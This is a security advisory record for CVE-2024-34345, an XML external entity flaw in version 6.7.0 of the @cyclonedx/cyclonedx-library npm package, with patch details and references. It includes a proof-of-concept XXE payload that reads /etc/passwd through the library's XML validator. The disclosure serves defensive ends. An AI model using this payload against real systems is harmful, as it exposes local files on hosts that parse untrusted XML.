{
  "id": "GHSA-38gf-rh2w-gmj7",
  "summary": "@cyclonedx/cyclonedx-library Improper Restriction of XML External Entity Reference vulnerability",
  "details": "### Impact\n\nXML External entity injections could be possible, when running the provided XML Validator on arbitrary input.\n\n#### POC\n\n```js\nconst {\n  Spec: { Version },\n  Validation: { XmlValidator }\n} = require('@cyclonedx/cyclonedx-library');\n\nconst version = Version.v1dot5;\nconst validator = new XmlValidator(version);\nconst input = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE poc [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<bom xmlns=\"http://cyclonedx.org/schema/bom/1.5\">\n  <components>\n    <component type=\"library\">\n      <name>testing</name>\n      <version>1.337</version>\n      <licenses>\n        <license>\n          <id>&xxe;</id><!-- << XML external entity (XXE) injection -->\n        </license>\n      </licenses>\n    </component>\n  </components>\n</bom>`;\n\n// validating this forged(^) input might lead to unintended behaviour\n// for the fact that the XML external entity would be taken into account.\nvalidator.validate(input).then(ve => {\n  console.error('validation error', ve);\n});\n```\n\n### Patches\n\nThis issue was fixed in `@cyclonedx/cyclonedx-library@6.7.1 `.\n\n\n\n### Workarounds\n\nDo not run the provided XML validator on untrusted inputs.\n\n### References\n\n* issue was introduced via <https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063>.  \n",
  "aliases": [
    "CVE-2024-34345"
  ],
  "modified": "2024-05-14T20:01:46Z",
  "published": "2024-05-08T19:55:37Z",
  "database_specific": {
    "nvd_published_at": "2024-05-14T15:38:40Z",
    "cwe_ids": [
      "CWE-611"
    ],
    "severity": "HIGH",
    "github_reviewed": true,
    "github_reviewed_at": "2024-05-08T19:55:37Z"
  },
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/CycloneDX/cyclonedx-javascript-library/security/advisories/GHSA-38gf-rh2w-gmj7"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-34345"
    },
    {
      "type": "WEB",
      "url": "https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063"
    },
    {
      "type": "WEB",
      "url": "https://github.com/CycloneDX/cyclonedx-javascript-library/commit/5e5e1e0b9422f47d2de81c7c4064b803a01e7203"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/CycloneDX/cyclonedx-javascript-library"
    }
  ],
  "affected": [
    {
      "package": {
        "name": "@cyclonedx/cyclonedx-library",
        "ecosystem": "npm",
        "purl": "pkg:npm/%40cyclonedx/cyclonedx-library"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "6.7.0"
            },
            {
              "fixed": "6.7.1"
            }
          ]
        }
      ],
      "versions": [
        "6.7.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-38gf-rh2w-gmj7/GHSA-38gf-rh2w-gmj7.json"
      }
    }
  ],
  "schema_version": "1.6.0",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
    }
  ]
}